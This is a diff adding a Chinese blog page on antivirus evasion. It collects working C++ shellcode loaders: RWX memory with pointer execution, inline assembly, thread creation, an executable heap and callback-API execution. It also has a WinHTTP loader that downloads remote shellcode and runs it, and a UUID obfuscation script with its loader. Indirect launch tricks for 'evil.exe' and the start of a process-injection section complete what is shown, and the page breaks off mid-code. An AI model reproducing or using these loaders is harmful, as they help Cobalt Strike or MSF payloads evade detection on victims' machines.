@@ -1,0 +1,1252 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    
+    
+    <link rel="shortcut icon" href="../../../../../../img/favicon.ico">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>基础免杀手法暴风吸入 - ConsT27's Blog</title>
+    <link href="../../../../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../../../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "\u57fa\u7840\u514d\u6740\u624b\u6cd5\u66b4\u98ce\u5438\u5165", url: "#_top", children: [
+              {title: "\u76ee\u5f55", url: "#_2" },
+          ]},
+          {title: "EXE", url: "#exe", children: [
+              {title: "\u52a0\u58f3", url: "#_3" },
+              {title: "\u6dfb\u52a0\u6570\u5b57\u7b7e\u540d", url: "#_4" },
+              {title: "\u95f4\u63a5\u8fd0\u884cexe", url: "#exe_1" },
+          ]},
+          {title: "C++", url: "#c", children: [
+              {title: "shellcode\u5904\u7406", url: "#shellcode" },
+              {title: "\u53cd\u8c03\u8bd5", url: "#_7" },
+              {title: "\u6c99\u7bb1\u7ed5\u8fc7\uff08Sandbox Evasion\uff09", url: "#sandbox-evasion" },
+              {title: "\u8fdb\u7a0b\u9542\u7a7a", url: "#_18" },
+              {title: "\u52a8\u6001\u8c03\u7528API", url: "#api" },
+          ]},
+          {title: "Powershell", url: "#powershell", children: [
+              {title: "\u8fdc\u7a0b\u6267\u884c\u4e0e\u672c\u5730\u6267\u884c", url: "#_19" },
+              {title: "\u547d\u4ee4\u62c6\u5206", url: "#_22" },
+          ]},
+          {title: "GO", url: "#go", children: [
+              {title: "FUNNY", url: "#funny" },
+              {title: "\u751f\u6210EXE", url: "#exe_2" },
+              {title: "\u7533\u8bf7\u5185\u5b58\u52a0\u8f7dshellcode", url: "#shellcode_9" },
+              {title: "\u7b80\u5355XOR", url: "#xor" },
+              {title: "\u6c99\u76d2\u0026amp;\u865a\u62df\u673a\u68c0\u6d4b", url: "#_23" },
+              {title: "\u8fdc\u7a0b\u8bfbshellcode", url: "#shellcode_10" },
+              {title: "\u8bfb\u53d6\u6587\u4ef6\u4e2d\u7684SHELLCODE", url: "#shellcode_11" },
+              {title: "\u6587\u4ef6\u91ca\u653e", url: "#_25" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../../../../js/base.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../../%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../../%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" class="btn btn-xs btn-link">
+        内网渗透
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../%E4%BB%8E0%E5%BC%80%E5%A7%8B%E7%94%A8C%2B%2B%E5%86%99%E4%B8%80%E4%B8%AA%E5%8A%A0%E5%A3%B3%E5%99%A8/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E7%94%A8C%2B%2B%E5%86%99%E4%B8%80%E4%B8%AA%E5%8A%A0%E5%A3%B3%E5%99%A8/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../%E4%BB%8E0%E5%BC%80%E5%A7%8B%E7%94%A8C%2B%2B%E5%86%99%E4%B8%80%E4%B8%AA%E5%8A%A0%E5%A3%B3%E5%99%A8/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E7%94%A8C%2B%2B%E5%86%99%E4%B8%80%E4%B8%AA%E5%8A%A0%E5%A3%B3%E5%99%A8/" class="btn btn-xs btn-link">
+        从0开始用C++写一个加壳器
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="_1">基础免杀手法暴风吸入</h1>
+<h2 id="_2">目录</h2>
+<ul>
+<li><a href="#EXE">EXE</a><ul>
+<li><a href="#加壳">加壳</a></li>
+<li><a href="#添加数字签名">添加数字签名</a></li>
+<li><a href="#间接运行exe">间接运行exe</a><ul>
+<li><a href="#forfiles">forfiles</a></li>
+<li><a href="#pcalua">pcalua</a></li>
+<li><a href="#cmd-Hijack">cmd Hijack</a></li>
+<li><a href="#conhost">conhost</a></li>
+<li><a href="#explorerexe">explorer.exe</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#C">C++</a><ul>
+<li><a href="#shellcode处理">shellcode处理</a><ul>
+<li><a href="#指针执行申请内存动态加载shellcode">指针执行+申请内存动态加载shellcode</a></li>
+<li><a href="#内联汇编加载shellcode">内联汇编加载shellcode</a></li>
+<li><a href="#创建线程执行shellcode">创建线程执行shellcode</a></li>
+<li><a href="#使用辅助堆栈加载shellcode">使用辅助堆栈加载shellcode</a></li>
+<li><a href="#HTTP协议远程读取shellcode">HTTP协议远程读取shellcode</a></li>
+<li><a href="#使用回调函数加载shellcode">使用回调函数加载shellcode</a></li>
+<li><a href="#使用加载器加载shellcode">使用加载器加载shellcode</a></li>
+<li><a href="#shellcode_-launcher-加载器">shellcode_ launcher 加载器</a></li>
+<li><a href="#SSI-加载器">SSI 加载器</a></li>
+<li><a href="#自写加载器">自写加载器</a></li>
+<li><a href="#shellcode变形">shellcode变形</a></li>
+<li><a href="#UUID变形">UUID变形</a></li>
+<li><a href="#shellcode注入进程内存">shellcode注入进程内存</a></li>
+<li><a href="#注入已有进程">注入已有进程</a></li>
+</ul>
+</li>
+<li><a href="#反调试">反调试</a><ul>
+<li><a href="#直接判断是否为调试状态">直接判断是否为调试状态</a></li>
+<li><a href="#检测软件断点">检测软件断点</a></li>
+<li><a href="#时间检测">时间检测</a></li>
+<li><a href="#检测父进程">检测父进程</a></li>
+<li><a href="#SEH中断">SEH中断</a></li>
+</ul>
+</li>
+<li><a href="#沙箱绕过Sandbox-Evasion">沙箱绕过（Sandbox Evasion）</a><ul>
+<li><a href="#System-Checks">System Checks</a></li>
+<li><a href="#检测函数是否被HOOK更改">检测函数是否被HOOK更改</a></li>
+<li><a href="#GetTickCount">GetTickCount</a></li>
+<li><a href="#CPURAM等信息">CPU,RAM等信息</a></li>
+<li><a href="#mac">mac</a></li>
+<li><a href="#分辨率">分辨率</a></li>
+<li><a href="#检查时区与时间流动性">检查时区与时间流动性</a></li>
+<li><a href="#检测文件名是否被沙箱更改">检测文件名是否被沙箱更改</a></li>
+<li><a href="#Time-Based-Evasion">Time-Based Evasion</a></li>
+<li><a href="#使用网络连接实时读取启动指令">使用网络连接实时读取启动指令</a></li>
+<li><a href="#User-Activity-Based-Checks">User Activity Based Checks</a></li>
+<li><a href="#鼠标移动轨迹">鼠标移动轨迹</a></li>
+<li><a href="#检测父进程">检测父进程</a></li>
+</ul>
+</li>
+<li><a href="#进程镂空">进程镂空</a></li>
+<li><a href="#动态调用API">动态调用API</a></li>
+</ul>
+</li>
+<li><a href="#Powershell">Powershell</a><ul>
+<li><a href="#远程执行与本地执行">远程执行与本地执行</a><ul>
+<li><a href="#远程执行">远程执行</a></li>
+<li><a href="#本地执行">本地执行</a></li>
+</ul>
+</li>
+<li><a href="#命令拆分">命令拆分</a></li>
+</ul>
+</li>
+<li><a href="#GO">GO</a><ul>
+<li><a href="#FUNNY">FUNNY</a></li>
+<li><a href="#生成EXE">生成EXE</a></li>
+<li><a href="#申请内存加载shellcode">申请内存加载shellcode</a></li>
+<li><a href="#简单XOR">简单XOR</a></li>
+<li><a href="#沙盒虚拟机检测">沙盒&amp;虚拟机检测</a><ul>
+<li><a href="#虚拟机敏感文件检测">虚拟机：敏感文件检测</a></li>
+</ul>
+</li>
+<li><a href="#远程读shellcode">远程读shellcode</a></li>
+<li><a href="#读取文件中的SHELLCODE">读取文件中的SHELLCODE</a></li>
+<li><a href="#文件释放">文件释放</a></li>
+</ul>
+</li>
+</ul>
+<hr />
+<p>前面的话:”免杀一般都是靠组合拳”</p>
+<h1 id="exe">EXE</h1>
+<h3 id="_3">加壳</h3>
+<p>没什么好说的。可以自写加壳器等等</p>
+<h3 id="_4">添加数字签名</h3>
+<p>不同的杀软对数字签名的敏感性不同，有些杀软可能只检查一下有没有数字签名就过了，有些杀软可能要去验证一下数字签名的正确性，有些可能管都不管数字签名。只能说添加数字签名能稍微提升一下exe的免杀几率。</p>
+<h3 id="exe_1">间接运行exe</h3>
+<p>平时我们运行一个exe： cmd /c c:\a.exe  但这样容易被杀或者命令被ban。所有就有一些间接运行exe的方法</p>
+<h4 id="forfiles">forfiles</h4>
+<p>forfiles是一个用于批处理的一个工具，它在找到文件后会执行指定的命令.</p>
+<pre><code class="language-纯文本">forfiles /p 指定搜索文件的目录 /m 指定搜索关键词 /c 指定要执行的命令
+forfiles /p c:\windows\system32 /m calc.exe /c c:\tmp\evil.exe  //evil.exe会成为forfiles.exe的子进程
+</code></pre>
+<h4 id="pcalua">pcalua</h4>
+<pre><code class="language-纯文本">pcalua -a c:\tmp\evil.exe  //evil.exe不会成为子进程
+</code></pre>
+<h4 id="cmd-hijack">cmd Hijack</h4>
+<p>下面命令将弹计算器</p>
+<pre><code class="language-纯文本">cmd.exe /c &quot;ping 127.0.0.1/../../../../../../../../../../../windows/system32/calc.exe&quot;
+
+cmd.exe /c &quot;ping ;a.exe; 127.0.0.1/../../../../../../../../../windows/system32/calc.exe&quot;
+
+ping ;a.exe 127.0.0.1/../../../../../../../../../../windows/system32/calc.exe
+</code></pre>
+<h4 id="conhost">conhost</h4>
+<p>大于win7可用</p>
+<pre><code class="language-纯文本">conhost c:\windows\system32\calc.exe
+conhost adsadas/../../../../../../../../../windows/system32/calc.exe
+
+以下指令win10某些版本无法使用
+conhost &quot;asddas c:\windows\system32\calc.exe&quot;
+</code></pre>
+<h4 id="explorerexe">explorer.exe</h4>
+<pre><code class="language-纯文本">explorer.exe c:\windows\system32\calc.exe
+explorer asdsadasd,&quot;c:\windows\system32\calc.exe&quot;
+</code></pre>
+<h1 id="c">C++</h1>
+<h3 id="shellcode">shellcode处理</h3>
+<h4 id="shellcode_1">指针执行+申请内存动态加载shellcode</h4>
+<p>首先从cobalt strike上生成拿到shellcode用作本次测试。
+然后通过下面的代码，直接执行写死在程序里的shellcode。</p>
+<pre><code class="language-纯文本">#include &lt;iostream&gt;
+#include&lt;Windows.h&gt;
+
+int main()
+{
+    unsigned char buf[] = &quot;shellcode&quot;;
+    void* exec = VirtualAlloc(0, sizeof buf, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+    memcpy(exec, buf, sizeof buf);
+    ((void(*)())exec)();
+    return 0;
+}
+</code></pre>
+<p><img alt="QQ截图20210217145713" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ截图20210217145713.png" title="QQ截图20210217145713" /></p>
+<p>可以看见，还是很拉跨的。</p>
+<h4 id="shellcode_2">内联汇编加载shellcode</h4>
+<p>c++有强大的内联汇编功能，上次写壳的时候就感受了一番。
+我们可以通过内联汇编代码加载shellcode.顺便加花什么的，都可以弄。</p>
+<pre><code class="language-纯文本">#include &lt;iostream&gt;
+#include&lt;Windows.h&gt;
+#include&lt;winhttp.h&gt;
+#pragma comment(lib, &quot;winhttp.lib&quot;)
+#pragma comment(lib,&quot;user32.lib&quot;)
+
+int main()
+{
+  unsigned char buf[] = &quot;shellcode&quot;;
+  _asm {
+    lea eax, buf;
+    jmp eax;
+  }
+}
+</code></pre>
+<p><img alt="QQ截图20210217145723" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ截图20210217145723.png" title="QQ截图20210217145723" /></p>
+<p>还是蛮拉跨的，虽然我没有加花。</p>
+<h4 id="shellcode_3">创建线程执行shellcode</h4>
+<pre><code class="language-纯文本">    unsigned char buf[] = &quot;shellcode&quot;;
+    void* exec = VirtualAlloc(0, sizeof buf, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+    memcpy(exec, buf, sizeof buf);  
+  DWORD dwThreadId = 0;
+  HANDLE hThread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)exec, NULL, NULL, &amp;dwThreadId);
+  WaitForSingleObject(hThread, INFINITE);
+</code></pre>
+<h4 id="shellcode_4">使用辅助堆栈加载shellcode</h4>
+<p>heapcreate 可以创建辅助堆栈并设置堆栈属性，然后用heapalloc分配堆栈大小</p>
+<pre><code class="language-纯文本">  char shellcode[] = &quot;&quot;;
+  HANDLE hHep = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE | HEAP_ZERO_MEMORY, 0, 0);
+  PVOID Mptr = HeapAlloc(hHep, 0, sizeof(shellcode));
+  RtlCopyMemory(Mptr, shellcode, sizeof(shellcode));
+  //然后就是对Mptr这段区域进行执行，如((void(*)())exec)()或创建线程执行等
+</code></pre>
+<h4 id="httpshellcode">HTTP协议远程读取shellcode</h4>
+<p>这次我们不把shellcode写死在程序之中，而是通过程序发起http请求向外界获得shellcode并执行。
+这里涉及到winhttp.h的一些函数的使用。</p>
+<p>源码借用一下 卿 的代码。它的代码是直接把shellcode的十六进制以字符串形式直接放到远程服务器上。像这样</p>
+<p><img alt="QQ截图20210217145737" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ截图20210217145737.png" title="QQ截图20210217145737" /></p>
+<pre><code class="language-纯文本">#include &lt;string&gt;
+#include &lt;iostream&gt;
+#include &lt;windows.h&gt;
+#include &lt;winhttp.h&gt;
+#pragma comment(lib,&quot;winhttp.lib&quot;)
+#pragma comment(lib,&quot;user32.lib&quot;)
+using namespace std;
+void main()
+{
+    DWORD dwSize = 0;
+    DWORD dwDownloaded = 0;
+    LPSTR pszOutBuffer = NULL;
+    HINTERNET  hSession = NULL,
+        hConnect = NULL,
+        hRequest = NULL;
+    BOOL  bResults = FALSE;
+    hSession = WinHttpOpen(L&quot;User-Agent&quot;, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
+    if (hSession)
+    {
+        hConnect = WinHttpConnect(hSession, L&quot;127.0.0.1&quot;, INTERNET_DEFAULT_HTTP_PORT, 0);
+    }
+
+    if (hConnect)
+    {
+        hRequest = WinHttpOpenRequest(hConnect, L&quot;POST&quot;, L&quot;qing.txt&quot;, L&quot;HTTP/1.1&quot;, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
+    }
+    LPCWSTR header = L&quot;Content-type: application/x-www-form-urlencoded/r/n&quot;;
+    SIZE_T len = lstrlenW(header);
+    WinHttpAddRequestHeaders(hRequest, header, DWORD(len), WINHTTP_ADDREQ_FLAG_ADD);
+    if (hRequest)
+    {
+        std::string data = &quot;name=host&amp;sign=xx11sad&quot;;
+        const void *ss = (const char *)data.c_str();
+        bResults = WinHttpSendRequest(hRequest, 0, 0, const_cast&lt;void *&gt;(ss), data.length(), data.length(), 0);
+        ////bResults=WinHttpSendRequest(hRequest,WINHTTP_NO_ADDITIONAL_HEADERS, 0,WINHTTP_NO_REQUEST_DATA, 0, 0, 0 );
+    }
+    if (bResults)
+    {
+        bResults = WinHttpReceiveResponse(hRequest, NULL);
+    }
+    if (bResults)
+    {
+        do
+        {
+            // Check for available data.
+            dwSize = 0;
+            if (!WinHttpQueryDataAvailable(hRequest, &amp;dwSize))
+            {
+                printf(&quot;Error %u in WinHttpQueryDataAvailable.\n&quot;, GetLastError());
+
+                break;
+            }
+
+            if (!dwSize)
+                break;
+
+            pszOutBuffer = new char[dwSize + 1];
+
+            if (!pszOutBuffer)
+            {
+                printf(&quot;Out of memory\n&quot;);
+                break;
+            }
+
+            ZeroMemory(pszOutBuffer, dwSize + 1);
+
+            if (!WinHttpReadData(hRequest, (LPVOID)pszOutBuffer, dwSize, &amp;dwDownloaded))
+            {
+                printf(&quot;Error %u in WinHttpReadData.\n&quot;, GetLastError());
+            }
+            else
+            {
+                printf(&quot;ok&quot;);
+            }
+            //char ShellCode[1024];
+            int code_length = strlen(pszOutBuffer);
+            char* ShellCode = (char*)calloc(code_length  /2 , sizeof(unsigned char));
+
+            for (size_t count = 0; count &lt; code_length / 2; count++){
+                sscanf(pszOutBuffer, &quot;%2hhx&quot;, &amp;ShellCode[count]);
+                pszOutBuffer += 2;
+            }
+            printf(&quot;%s&quot;, ShellCode);
+            //strcpy(ShellCode,pszOutBuffer);
+            void *exec = VirtualAlloc(0, sizeof ShellCode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+            memcpy(exec, ShellCode, sizeof ShellCode);
+            ((void(*)())exec)();
+            delete[] pszOutBuffer;
+            if (!dwDownloaded)
+                break;
+        } while (dwSize &gt; 0);
+    }
+    if (hRequest) WinHttpCloseHandle(hRequest);
+    if (hConnect) WinHttpCloseHandle(hConnect);
+    if (hSession) WinHttpCloseHandle(hSession);
+    system(&quot;pause&quot;);
+}
+</code></pre>
+<p>大致流程便是:</p>
+<p>1.通过winhttp中的函数，以HTTP的方法获取远程服务器上的shellcode（此时shellcode在内存中是按照编码结果存储的，如下图，左边是内存原文，右边是内存解码（shellcode））</p>
+<p><img alt="QQ截图20210217145818" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ截图20210217145818.png" title="QQ截图20210217145818" /></p>
+<p>2.开辟一段内存，然后通过sscanf等方法读取存储shellcode变量的内容，将内存解码信息录入新的内存空间,使shellcode存在于内存中
+3.执行shellcode，可以用指针执行等方法执行。</p>
+<h4 id="shellcode_5">使用回调函数加载shellcode</h4>
+<p>windows API中有很多支持回调函数的API，这就意味着我们可以调用此类API并在用作回调函数的参数中传入shellcode，在API满足一些条件后便会执行它的回调函数，对于我们就是说执行我们的shellcode。</p>
+<p>举几个例子</p>
+<pre><code class="language-纯文本">sc是指向shellcode区域的指针
+
+EnumSystemLanguageGroupsA((LANGUAGEGROUP_ENUMPROCA)sc, LGRPID_INSTALLED, NULL);
+
+ImmEnumInputContext(0, (IMCENUMPROC)sc, 1);
+</code></pre>
+<p>也挺好找的，在微软文档上直接搜CALLBACK就能搜到一大堆回调函数。</p>
+<p><img alt="image-20211111145543525" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211111145543525.png" title="image-20211111145543525" /></p>
+<p>我在ropgadget博客上也嫖到了一些。</p>
+<pre><code class="language-纯文本">AddClusterNode  BluetoothRegisterForAuthentication  CMTranslateRGBsExt
+CallWindowProcA  CallWindowProcW  CreateCluster
+CreateDialogIndirectParamA  CreateDialogIndirectParamW  CreateDialogParamA
+CreateDialogParamW  CreatePrintAsyncNotifyChannel  CreateTimerQueueTimer
+DavRegisterAuthCallback  DbgHelpCreateUserDump  DbgHelpCreateUserDumpW
+DdeInitializeA  DdeInitializeW  DestroyCluster
+DialogBoxIndirectParamA  DialogBoxIndirectParamW  DialogBoxParamA
+DialogBoxParamW  DirectSoundCaptureEnumerateA  DirectSoundCaptureEnumerateW
+DirectSoundEnumerateA  DirectSoundEnumerateW  DrawStateA
+DrawStateW  EnumCalendarInfoA  EnumCalendarInfoW
+EnumChildWindows  EnumDateFormatsA  EnumDateFormatsW
+EnumDesktopWindows  EnumDesktopsA  EnumDesktopsW
+EnumEnhMetaFile  EnumFontFamiliesA  EnumFontFamiliesExA
+EnumFontFamiliesExW  EnumFontFamiliesW  EnumFontsA
+EnumFontsW  EnumICMProfilesA  EnumICMProfilesW
+EnumLanguageGroupLocalesA  EnumLanguageGroupLocalesW  EnumMetaFile
+EnumObjects  EnumPropsExA  EnumPropsExW
+EnumPwrSchemes  EnumResourceLanguagesA  EnumResourceLanguagesExA
+EnumResourceLanguagesExW  EnumResourceLanguagesW  EnumResourceNamesA
+EnumResourceNamesExA  EnumResourceNamesExW  EnumResourceNamesW
+EnumResourceTypesA  EnumResourceTypesW  EnumResourceTypesExA
+EnumResourceTypesExW  EnumResourceTypesW  EnumSystemCodePagesA
+EnumSystemCodePagesW  EnumSystemLanguageGroupsA  EnumSystemLanguageGroupsW
+EnumSystemLocalesA  EnumSystemLocalesW  EnumThreadWindows
+EnumTimeFormatsA  EnumTimeFormatsW  EnumUILanguagesA
+EnumUILanguagesW  EnumWindowStationsA  EnumWindowStationsW
+EnumWindows  EnumerateLoadedModules  EnumerateLoadedModulesEx
+EnumerateLoadedModulesExW  EventRegister  GetApplicationRecoveryCallback
+GrayStringA  GrayStringW  KsCreateFilterFactory
+KsMoveIrpsOnCancelableQueue  KsStreamPointerClone  KsStreamPointerScheduleTimeout
+LineDDA  MFBeginRegisterWorkQueueWithMMCSS  MFBeginUnregisterWorkQueueWithMMCSS
+MFPCreateMediaPlayer  MQReceiveMessage  MQReceiveMessageByLookupId
+NotifyIpInterfaceChange  NotifyStableUnicastIpAddressTable  NotifyTeredoPortChange
+NotifyUnicastIpAddressChange  PerfStartProvider  PlaExtractCabinet
+ReadEncryptedFileRaw  RegisterApplicationRecoveryCallback  RegisterForPrintAsyncNotifications
+RegisterServiceCtrlHandlerExA  RegisterServiceCtrlHandlerExW  RegisterWaitForSingleObject
+RegisterWaitForSingleObjectEx  SHCreateThread  SHCreateThreadWithHandle
+SendMessageCallbackA  SendMessageCallbackW  SetTimerQueueTimer
+SetWinEventHook  SetWindowsHookExA  SetWindowsHookExW
+SetupDiRegisterDeviceInfo  SymEnumLines  SymEnumLinesW
+SymEnumProcesses  SymEnumSourceLines  SymEnumSourceLinesW
+SymEnumSymbols  SymEnumSymbolsForAddr  SymEnumSymbolsForAddrW
+SymEnumSymbolsW  SymEnumTypes  SymEnumTypesByName
+SymEnumTypesByNameW  SymEnumTypesW  SymEnumerateModules
+SymEnumerateModules64  SymEnumerateSymbols  SymEnumerateSymbols64
+SymEnumerateSymbolsW  SymSearch  SymSearchW
+TranslateBitmapBits  WPUQueryBlockingCallback  WdsCliTransferFile
+WdsCliTransferImage  WinBioCaptureSampleWithCallback  WinBioEnrollCaptureWithCallback
+WinBioIdentifyWithCallback  WinBioLocateSensorWithCallback  WinBioRegisterEventMonitor
+WinBioVerifyWithCallback  WlanRegisterNotification  WriteEncryptedFileRaw
+WsPullBytes  WsPushBytes  WsReadEnvelopeStart
+WsRegisterOperationForCancel  WsWriteEnvelopeStart  mciSetYieldProc
+midiInOpen  midiOutOpen  mixerOpen
+mmioInstallIOProcA  mmioInstallIOProcW  waveInOpen
+waveOutOpen
+
+</code></pre>
+<h4 id="shellcode_6">使用加载器加载shellcode</h4>
+<h4 id="shellcode_-launcher">shellcode_ launcher 加载器</h4>
+<p><a href="https://github.com/clinicallyinane/shellcode_launcher/" title="https://github.com/clinicallyinane/shellcode_launcher/">https://github.com/clinicallyinane/shellcode_launcher/</a></p>
+<p>用msf或者cs生成raw形式shellcode，然后使用这个加载器加载一下就行了.
+像这样 shellcode_launcher.exe -i C:\payload32.bin
+shellcode_ launcher 在virustotal上报毒率也是很高很高了…</p>
+<h4 id="ssi">SSI 加载器</h4>
+<p><a href="https://github.com/DimopoulosElias/SimpleShellcodeInjector" title="https://github.com/DimopoulosElias/SimpleShellcodeInjector">https://github.com/DimopoulosElias/SimpleShellcodeInjector</a></p>
+<p>cs生成c形式shellcode，然后去除\x，再拿给ssi加载器加载,像这样</p>
+<p><img alt="QQ截图20210217145832" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ截图20210217145832.png" title="QQ截图20210217145832" /></p>
+<p>ssi.exe shellcode 即可完成加载</p>
+<p>ssi在virustotal上报毒率也是非常高..</p>
+<h4 id="_5">自写加载器</h4>
+<p>ssi源码很简单大家可以参考写一下</p>
+<h4 id="shellcode_7">shellcode变形</h4>
+<p>大思路就是把shellcode混淆后，放入加载器加载运行。
+其细分思路就包括怎么把shellcode进行混淆了，简单的有XOR,BASE64，复杂一点的有AES等。
+这里就只说说xor。
+首先我们得准备一个程序将shellcode进行混淆。图方便就拿python写也是蛮不错的。
+随便写了一个。效果真不戳（虽然上传了vt过两天就肯定不能用了)</p>
+<p><img alt="QQ截图20210217145855" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ截图20210217145855.png" title="QQ截图20210217145855" /></p>
+<p>github:<a href="https://github.com/ConsT27/SimpleXORshellcode" title="https://github.com/ConsT27/SimpleXORshellcode">https://github.com/ConsT27/SimpleXORshellcode</a></p>
+<h4 id="uuid">UUID变形</h4>
+<p>可以把shellcode变形为UUID，要用的时候再变回来。</p>
+<p>相关API有</p>
+<pre><code class="language-纯文本">RPC_STATUS UuidFromString(
+  RPC_CSTR StringUuid,
+  UUID     *Uuid
+);
+功能：将字符串UUID转换为UUID结构。
+
+RPC_STATUS UuidCreate(
+  UUID *Uuid
+);
+功能：创建UUID结构。
+
+int UuidEqual(
+  UUID       *Uuid1,
+  UUID       *Uuid2,
+  RPC_STATUS *Status
+);
+功能：判断两个UUID是否相等。
+</code></pre>
+<p>这里借用倾璇的UUID生成脚本来生产shellcode对应的UUID</p>
+<pre><code class="language-纯文本">from uuid import UUID
+import os
+import sys
+
+# Usage: python3 binToUUIDs.py shellcode.bin [--print]
+
+print(&quot;&quot;&quot;
+  ____  _    _______    _    _ _    _ _____ _____       
+ |  _ \(_)  |__   __|  | |  | | |  | |_   _|  __ \      
+ | |_) |_ _ __ | | ___ | |  | | |  | | | | | |  | |___  
+ |  _ &lt;| | '_ \| |/ _ \| |  | | |  | | | | | |  | / __| 
+ | |_) | | | | | | (_) | |__| | |__| |_| |_| |__| \__ \ 
+ |____/|_|_| |_|_|\___/ \____/ \____/|_____|_____/|___/
+\n&quot;&quot;&quot;)
+
+with open(sys.argv[1], &quot;rb&quot;) as f:
+    bin = f.read()
+
+if len(sys.argv) &gt; 2 and sys.argv[2] == &quot;--print&quot;:
+    outputMapping = True
+else:
+    outputMapping = False
+
+offset = 0
+
+print(&quot;Length of shellcode: {} bytes\n&quot;.format(len(bin)))
+
+out = &quot;&quot;
+
+while(offset &lt; len(bin)):
+    countOfBytesToConvert = len(bin[offset:])
+    if countOfBytesToConvert &lt; 16:
+        ZerosToAdd = 16 - countOfBytesToConvert
+        byteString = bin[offset:] + (b'\x00'* ZerosToAdd)
+        uuid = UUID(bytes_le=byteString)
+    else:
+        byteString = bin[offset:offset+16]
+        uuid = UUID(bytes_le=byteString)
+    offset+=16
+
+    out += &quot;\&quot;{}\&quot;,\n&quot;.format(uuid)
+
+    if outputMapping:
+        print(&quot;{} -&gt; {}&quot;.format(byteString, uuid))
+
+with open(sys.argv[1] + &quot;UUIDs&quot;, &quot;w&quot;) as f:
+    f.write(out)
+
+print(&quot;Outputted to: {}&quot;.format(sys.argv[1] + &quot;UUIDs&quot;))
+</code></pre>
+<p><img alt="image-20211110214628133" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211110214628133.png" title="image-20211110214628133" /></p>
+<p>然后实际加载器文件为</p>
+<pre><code class="language-纯文本">#pragma comment(lib,&quot;Rpcrt4.lib&quot;)
+
+int main(int argc, char* argv[]) {
+  const char * buf[] = { &quot;0089e8fc-0000-8960-e531-d2648b52308b&quot;,
+&quot;528b0c52-8b14-2872-0fb7-4a2631ff31c0&quot;,
+&quot;7c613cac-2c02-c120-cf0d-01c7e2f05257&quot;,
+&quot;8b10528b-3c42-d001-8b40-7885c0744a01&quot;,
+  };
+  const int num = sizeof(buf) / sizeof(buf[0]);
+  HANDLE hMemory = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE | HEAP_ZERO_MEMORY, 0, 0);
+  if (hMemory == NULL) {
+    return -1;
+  }
+  PVOID pMemory = HeapAlloc(hMemory, 0, 2048);
+
+  DWORD_PTR CodePtr = (DWORD_PTR)pMemory;
+  for (int i = 0; i &lt; num; i++) {
+    RPC_STATUS  status = UuidFromStringA(RPC_CSTR(buf[i]), (UUID*)CodePtr);
+    CodePtr += 16;
+  }
+  DWORD dwThreadId = 0;
+  HANDLE hThread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)pMemory, NULL, NULL, &amp;dwThreadId);
+  WaitForSingleObject(hThread, INFINITE);
+}
+</code></pre>
+<p><img alt="image-20211111142159645" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211111142159645.png" title="image-20211111142159645" /></p>
+<h4 id="shellcode_8">shellcode注入进程内存</h4>
+<h4 id="_6">注入已有进程</h4>
+<p>大致逻辑:OpenProcess获得进程句柄-&gt;VirtualAllocEx在进程中开辟一段内存空间-&gt;WriteProcessMemory向刚刚开辟的内存空间中写入shellcode-&gt;CreateRemoteThread为刚刚写入的shellcode创建一个线程执行</p>
+<pre><code class="language-纯文本">#include &lt;iostream&gt;
